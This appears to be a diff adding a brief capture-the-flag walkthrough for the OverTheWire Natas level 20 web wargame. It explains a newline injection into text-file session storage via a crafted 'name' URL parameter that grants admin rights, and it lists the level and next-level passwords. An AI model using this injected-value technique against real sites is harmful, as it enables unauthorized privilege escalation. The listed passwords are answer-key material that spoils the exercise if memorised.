@@ -1,0 +1,11 @@
+URL: http://natas20.natas.labs.overthewire.org
+user: natas20
+password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+data injection. 
+text file session storage usage, 'name $NAME' format saving. Inserting '$NAME\nadmin 1' makes us admin.
+Visit http://natas20.natas.labs.overthewire.org/index.php?debug=1&name=admin%0Aadmin%201
+This creates the session file.
+Refresh. We get the pass.
+
+natas21 pass: IFekPyrQXftziDEsUr3x21sYuahypdgJ
